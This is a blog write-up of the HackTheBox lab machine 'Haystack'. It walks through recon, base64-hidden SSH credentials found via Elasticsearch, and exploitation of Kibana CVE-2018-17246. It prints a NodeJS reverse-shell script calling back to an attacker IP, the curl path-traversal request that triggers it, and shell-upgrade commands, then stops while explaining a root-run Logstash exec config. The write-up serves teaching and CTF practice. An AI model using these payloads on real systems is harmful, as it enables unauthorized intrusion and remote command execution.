<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Haystack - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.
First thing first, let&amp;rsquo;s add the box IP to the hosts file:
echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
$ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7."/>
<meta name="keywords" content="hackthebox, ctf, haystack, gobuster, steganography, elasticsearch, logstash, kibana, elk, cve-2018-17246, lfi"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/haystack/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">



<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Haystack - HackTheBox"/>
<meta name="twitter:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario"/>



<meta property="og:title" content="Haystack - HackTheBox" />
<meta property="og:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/haystack/" />
<meta property="article:published_time" content="2019-11-02T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-11-02T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.rocks</span>
    <span class="logo__cursor"></span>
  
</a>


    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="24">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h2 class="post-title"><a href="/posts/haystack/">Haystack - HackTheBox</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          2019-11-02
        </span>

        
          
        
      

      <span class="post-author">— Written by hg8</span>
      
        <span class="post-read-time">— 8 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/haystack/">haystack</a>&nbsp;
        
          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
        
          #<a href="/tags/steganography/">steganography</a>&nbsp;
        
          #<a href="/tags/elasticsearch/">elasticsearch</a>&nbsp;
        
          #<a href="/tags/logstash/">logstash</a>&nbsp;
        
          #<a href="/tags/kibana/">kibana</a>&nbsp;
        
          #<a href="/tags/elk/">elk</a>&nbsp;
        
          #<a href="/tags/cve-2018-17246/">cve-2018-17246</a>&nbsp;
        
          #<a href="/tags/lfi/">lfi</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/haystack-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p>
<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#39;10.10.10.115 haystack.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h1 id="user-flag">User Flag</h1>
<h2 id="recon">Recon</h2>
<p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
<pre><code>$ nmap -sV -sT -sC 10.10.10.115
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 22:08 CEST
Nmap scan report for haystack.htb (10.10.10.115)
Host is up (0.75s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    nginx 1.12.2
9200/tcp open  http    nginx 1.12.2

Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds
</code></pre><p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let&rsquo;s start.</p>
<h3 id="http">http</h3>
<p>Once opening <a href="http://haystack.htb">http://haystack.htb</a> we are greeted with a single image.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;needle.jpg&#34;</span> /&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p><code>gobuster</code> doesn&rsquo;t find anything else interresting. So let&rsquo;s check this image :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget haystack.htb/needle.jpg
$ file needle.jpg
needle.jpg: JPEG image data, JFIF standard 1.01, resolution <span style="color:#f92672">(</span>DPI<span style="color:#f92672">)</span>, density 96x96, segment length 16, Exif Standard: <span style="color:#f92672">[</span>TIFF image data, big-endian, direntries<span style="color:#f92672">=</span>5, xresolution<span style="color:#f92672">=</span>74, yresolution<span style="color:#f92672">=</span>82, resolutionunit<span style="color:#f92672">=</span>2, software<span style="color:#f92672">=</span>paint.net 4.1.1<span style="color:#f92672">]</span>, baseline, precision 8, 1200x803, components <span style="color:#ae81ff">3</span>
</code></pre></div><p>So far so good, nothing suspicious. Let&rsquo;s see if we can find strings in it :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings needle.jpg
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg<span style="color:#f92672">=</span><span style="color:#f92672">=</span>
</code></pre></div><p>Let&rsquo;s decode this base64 string :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&#34;</span> | base64 -d
la aguja en el pajar es <span style="color:#e6db74">&#34;clave&#34;</span>
</code></pre></div><p>A hint. Let&rsquo;s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let&rsquo;s move on to the Elasticsearch instance.</p>
<h3 id="elasticsearch">Elasticsearch</h3>
<p>Opening port 9200 return the following json:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">y</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9200</span>
<span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>

{
    <span style="color:#f92672">&#34;cluster_name&#34;</span>: <span style="color:#e6db74">&#34;elasticsearch&#34;</span>,
    <span style="color:#f92672">&#34;cluster_uuid&#34;</span>: <span style="color:#e6db74">&#34;pjrX7V_gSFmJY-DxP4tCQg&#34;</span>,
    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;iQEYHgS&#34;</span>,
    <span style="color:#f92672">&#34;tagline&#34;</span>: <span style="color:#e6db74">&#34;You Know, for Search&#34;</span>,
    <span style="color:#f92672">&#34;version&#34;</span>: {
        <span style="color:#f92672">&#34;build_date&#34;</span>: <span style="color:#e6db74">&#34;2018-09-26T13:34:09.098244Z&#34;</span>,
        <span style="color:#f92672">&#34;build_flavor&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
        <span style="color:#f92672">&#34;build_hash&#34;</span>: <span style="color:#e6db74">&#34;04711c2&#34;</span>,
        <span style="color:#f92672">&#34;build_snapshot&#34;</span>: <span style="color:#66d9ef">false</span>,
        <span style="color:#f92672">&#34;build_type&#34;</span>: <span style="color:#e6db74">&#34;rpm&#34;</span>,
        <span style="color:#f92672">&#34;lucene_version&#34;</span>: <span style="color:#e6db74">&#34;7.4.0&#34;</span>,
        <span style="color:#f92672">&#34;minimum_index_compatibility_version&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
        <span style="color:#f92672">&#34;minimum_wire_compatibility_version&#34;</span>: <span style="color:#e6db74">&#34;5.6.0&#34;</span>,
        <span style="color:#f92672">&#34;number&#34;</span>: <span style="color:#e6db74">&#34;6.4.2&#34;</span>
    }
}
</code></pre></div><p>It&rsquo;s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p>
<p>We can use the <code>_cat</code> endpoint to list all indexes :</p>
<pre><code>$ http &quot;haystack.htb:9200/_cat/indices&quot;
HTTP/1.1 200 OK

.kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb
quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
</code></pre><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let&rsquo;s search across those documents to see if we can find something interesting with our previous hint in mind.</p>
<p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn&rsquo;t seem to return any interesting user or information. Let&rsquo;s try with the <code>clave</code> keyword we found in the image :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#e6db74">&#34;haystack.htb:9200/_search?q=clave&#34;</span>
<span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>


{
    <span style="color:#f92672">&#34;_shards&#34;</span>: {
        <span style="color:#f92672">&#34;failed&#34;</span>: <span style="color:#ae81ff">0</span>,
        <span style="color:#f92672">&#34;skipped&#34;</span>: <span style="color:#ae81ff">0</span>,
        <span style="color:#f92672">&#34;successful&#34;</span>: <span style="color:#ae81ff">11</span>,
        <span style="color:#f92672">&#34;total&#34;</span>: <span style="color:#ae81ff">11</span>
    },
    <span style="color:#f92672">&#34;hits&#34;</span>: {
        <span style="color:#f92672">&#34;hits&#34;</span>: [
            {
                <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;45&#34;</span>,
                <span style="color:#f92672">&#34;_index&#34;</span>: <span style="color:#e6db74">&#34;quotes&#34;</span>,
                <span style="color:#f92672">&#34;_score&#34;</span>: <span style="color:#ae81ff">5.9335938</span>,
                <span style="color:#f92672">&#34;_source&#34;</span>: {
                    <span style="color:#f92672">&#34;quote&#34;</span>: <span style="color:#e6db74">&#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &#34;</span>
                },
                <span style="color:#f92672">&#34;_type&#34;</span>: <span style="color:#e6db74">&#34;quote&#34;</span>
            },
            {
                <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;111&#34;</span>,
                <span style="color:#f92672">&#34;_index&#34;</span>: <span style="color:#e6db74">&#34;quotes&#34;</span>,
                <span style="color:#f92672">&#34;_score&#34;</span>: <span style="color:#ae81ff">5.3459888</span>,
                <span style="color:#f92672">&#34;_source&#34;</span>: {
                    <span style="color:#f92672">&#34;quote&#34;</span>: <span style="color:#e6db74">&#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&#34;</span>
                },
                <span style="color:#f92672">&#34;_type&#34;</span>: <span style="color:#e6db74">&#34;quote&#34;</span>
            }
        ],
        <span style="color:#f92672">&#34;max_score&#34;</span>: <span style="color:#ae81ff">5.9335938</span>,
        <span style="color:#f92672">&#34;total&#34;</span>: <span style="color:#ae81ff">2</span>
    },
    <span style="color:#f92672">&#34;timed_out&#34;</span>: <span style="color:#66d9ef">false</span>,
    <span style="color:#f92672">&#34;took&#34;</span>: <span style="color:#ae81ff">25</span>
}
</code></pre></div><p>Neat, sounds promising. Let&rsquo;s decode :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#39;dXNlcjogc2VjdXJpdHkg&#39;</span> | base64 -d
user: security

$ echo <span style="color:#e6db74">&#39;cGFzczogc3BhbmlzaC5pcy5rZXk=&#39;</span> | base64 -d
pass: spanish.is.key
</code></pre></div><p>An username and a password, couldn&rsquo;t ask for anything better! Is that SSH credentials ?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh security@haystack.htb
security@haystack.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
Last login: Thu Aug <span style="color:#ae81ff">29</span> 16:24:15 <span style="color:#ae81ff">2019</span> from 10.10.10.85
<span style="color:#f92672">[</span>security@haystack ~<span style="color:#f92672">]</span>$
<span style="color:#f92672">[</span>security@haystack ~<span style="color:#f92672">]</span>$ cat user.txt
04d1xxxxxxxxxxxxxxx8eb929
</code></pre></div><p>First step done. Time for root.</p>
<h1 id="root-flag">Root flag</h1>
<p>Now that we have user let&rsquo;s try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let&rsquo;s focus on the ELK stack again which seems the core part of this box.</p>
<h2 id="pivot-security---kibana-user">Pivot security -&gt; kibana user</h2>
<p>Kibana and Logstash are installed but configuration files are inaccesible to the <code>security</code> user :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>security@haystack conf.d<span style="color:#f92672">]</span>$ cat /etc/passwd
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
security:x:1000:1000:security:/home/security:/bin/bash
elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin
logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin
kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin

<span style="color:#f92672">[</span>security@haystack conf.d<span style="color:#f92672">]</span>$ cd /opt/kibana/
-bash: cd: /opt/kibana/: Permiso denegado

<span style="color:#f92672">[</span>security@haystack conf.d<span style="color:#f92672">]</span>$ cat /etc/logstash/conf.d/filter.conf
cat: /etc/logstash/conf.d/filter.conf: Permiso denegado
</code></pre></div><p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p>
<p>For now we don&rsquo;t have informations about neither Kibana nor Logstash. Let&rsquo;s check Elasticsearch again :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">y</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9200</span>
<span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>

{

    <span style="color:#f92672">&#34;cluster_name&#34;</span>: <span style="color:#e6db74">&#34;elasticsearch&#34;</span>,
    <span style="color:#f92672">&#34;cluster_uuid&#34;</span>: <span style="color:#e6db74">&#34;pjrX7V_gSFmJY-DxP4tCQg&#34;</span>,
    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;iQEYHgS&#34;</span>,
    <span style="color:#f92672">&#34;tagline&#34;</span>: <span style="color:#e6db74">&#34;You Know, for Search&#34;</span>,
    <span style="color:#f92672">&#34;version&#34;</span>: {
        <span style="color:#f92672">&#34;build_date&#34;</span>: <span style="color:#e6db74">&#34;2018-09-26T13:34:09.098244Z&#34;</span>,
        <span style="color:#f92672">&#34;build_flavor&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
        <span style="color:#f92672">&#34;build_hash&#34;</span>: <span style="color:#e6db74">&#34;04711c2&#34;</span>,
        <span style="color:#f92672">&#34;build_snapshot&#34;</span>: <span style="color:#66d9ef">false</span>,
        <span style="color:#f92672">&#34;build_type&#34;</span>: <span style="color:#e6db74">&#34;rpm&#34;</span>,
        <span style="color:#f92672">&#34;lucene_version&#34;</span>: <span style="color:#e6db74">&#34;7.4.0&#34;</span>,
        <span style="color:#f92672">&#34;minimum_index_compatibility_version&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
        <span style="color:#f92672">&#34;minimum_wire_compatibility_version&#34;</span>: <span style="color:#e6db74">&#34;5.6.0&#34;</span>,
        <span style="color:#f92672">&#34;number&#34;</span>: <span style="color:#e6db74">&#34;6.4.2&#34;</span>
    }
}

</code></pre></div><p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That&rsquo;s quite old.</p>
<p>And indeed after a bit of GoogleFu we stumbled upon CVE-2018-17246 :</p>
<blockquote>
<p>Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>
</blockquote>
<p>More informations are available on <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">CyberArk website</a> and gives us example on how to run this exploit.</p>
<p>First we need to write a NodeJS reserve shell (I used the one found <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell">here</a>) to the <code>/tmp/hg8.js</code> folder:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">(<span style="color:#66d9ef">function</span>(){
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, []);
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Socket</span>();
    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#ae81ff">8585</span>, <span style="color:#e6db74">&#34;10.10.10.10&#34;</span>, <span style="color:#66d9ef">function</span>(){
        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdin</span>);
        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
    });
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/a/</span>;
})();
</code></pre></div><p>Start <code>netcat</code> utility to listen for the reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>Let&rsquo;s now launch the exploit on the local instance of Kibana.
According to the <a href="https://www.elastic.co/guide/en/kibana/current/settings.html">documentation</a> Kibana runs on port <code>5601</code> :</p>
<blockquote>
<p>The default settings configure Kibana to run on localhost:5601.</p>
</blockquote>
<p>We now have every informations needed, let&rsquo;s launch our exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js&#34;</span>
</code></pre></div><p>On our <code>netcat</code> the connection appear :</p>
<pre><code>$ nc -l -vv -p 8585
Listening on any address 8585
Connection from 10.10.10.10:53792
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
</code></pre><p>Good we are on Kibana user now.</p>
<p>Let&rsquo;s upgrade our shell to a fully interactive one for easiest work (check out this <a href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/">blog post</a> for more informations):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
$ export TERM<span style="color:#f92672">=</span>xterm-256color
$ export SHELL<span style="color:#f92672">=</span>/bin/bash
$ <span style="color:#75715e"># CTRL + Z</span>
$ stty raw -echo;fg
                        reset
$
</code></pre></div><h2 id="logstash---root">Logstash -&gt; root</h2>
<p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can&rsquo;t be accessed.</p>
<p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let&rsquo;s dig.</p>
<p>As a reminder Logstash is a tool that collect various logs, parses them, and writes the parsed data to an Elasticsearch cluster :</p>
<blockquote>
<p>Logstash (part of the Elastic Stack) integrates data from any source, in any format with this flexible, open source collection, parsing, and enrichment pipeline.
<a href="https://www.elastic.co/fr/products/logstash">https://www.elastic.co/fr/products/logstash</a></p>
</blockquote>
<p>Once reading the <code>startup.options</code> file, an information catch the eye :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/logstash/startup.options
<span style="color:#75715e"># user and group id to be invoked as</span>
<span style="color:#75715e">#LS_USER=logstash</span>
<span style="color:#75715e">#LS_GROUP=logstash</span>
LS_USER<span style="color:#f92672">=</span>root
LS_GROUP<span style="color:#f92672">=</span>root
</code></pre></div><p>So Logstash will run not as <code>logstash</code> user but as <code>root</code> user. We are on the right track.
The <code>conf.d</code> folder contains three files. According to its contents, here what each file do:</p>
<ul>
<li><code>input.conf</code> tell Logstash where to search for logs.</li>
<li><code>filter.conf</code> filter what data is treated and what is ignored.</li>
<li><code>output.conf</code> define what to do with parsed data.</li>
</ul>
<p>Let&rsquo;s look first at <code>input.conf</code> and <code>output.conf</code> :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat input.conf
input <span style="color:#f92672">{</span>
	file <span style="color:#f92672">{</span>
		path <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;/opt/kibana/logstash_*&#34;</span>
		start_position <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;beginning&#34;</span>
		sincedb_path <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;/dev/null&#34;</span>
		stat_interval <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;10 second&#34;</span>
		type <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;execute&#34;</span>
		mode <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;read&#34;</span>
	<span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

$ cat output.conf
output <span style="color:#f92672">{</span>
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span>type<span style="color:#f92672">]</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;execute&#34;</span> <span style="color:#f92672">{</span>
		stdout <span style="color:#f92672">{</span> codec <span style="color:#f92672">=</span>&gt; json <span style="color:#f92672">}</span>
		exec <span style="color:#f92672">{</span>
			command <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;%{comando} &amp;&#34;</span>
		<span style="color:#f92672">}</span>
	<span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>According to this config Logstash will, every 10 seconds :</p>
<ol>
<li>Check for file named <code>logstash_*</code> in the <code>/opt/kibana/</code> folder.</li>
</ol>
<pre><code>path =&gt; &quot;/opt/kibana/logstash_*&quot;
stat_interval =&gt; &quot;10 second&quot;
type =&gt; &quot;execute&quot;
mode =&gt; &quot;read&quot;
</code></pre><ol start="2">
<li>
<p>Check the file content for data matching filters (a regex) defined in <code>filter.conf</code>.</p>
</li>
<li>
<p>Send the matched data to be executed in background :</p>
</li>
</ol>
